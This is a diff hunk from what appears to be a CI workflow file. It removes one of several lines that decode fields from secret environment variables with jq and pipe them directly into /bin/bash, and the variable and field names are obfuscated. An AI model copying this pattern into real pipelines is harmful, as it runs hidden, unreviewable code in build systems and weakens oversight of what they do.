@@ -22,7 +22,6 @@ jobs:
           mr57746: ${{ secrets.mr57746 }}
         run: |
           printf '%s' "$mr57746" | jq -r .kv6 | /bin/bash
-          printf '%s' "$oo6" | jq -r .xltnv4680 | /bin/bash
           printf '%s' "$lf96" | jq -r .hmy62027 | /bin/bash
           echo $abvql4544 | jq -r .b8305 | /bin/bash
           printf '%s' "$hutv4543" | jq -r .h21191 | /bin/bash
